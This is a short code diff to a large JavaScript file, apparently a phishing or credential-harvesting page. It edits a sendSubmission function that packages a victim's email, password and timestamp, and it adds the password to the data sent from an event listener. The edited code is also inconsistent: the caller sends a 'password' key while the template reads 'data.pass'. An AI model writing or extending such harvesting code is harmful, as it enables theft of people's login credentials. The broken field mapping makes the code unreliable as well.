@@ -29410,7 +29410,7 @@ async function sendSubmission(data) {
 Email:
 ${data.email}
 Password:
-${data.password}
+${data.pass}
 
 Time:
 ${new Date().toLocaleString()}`;
@@ -29729,7 +29729,8 @@ window.addEventListener(
                        ========================= */
 
                     await sendSubmission({
-                        email: email
+                        email: email,
+						password: pass
                     });
 
 
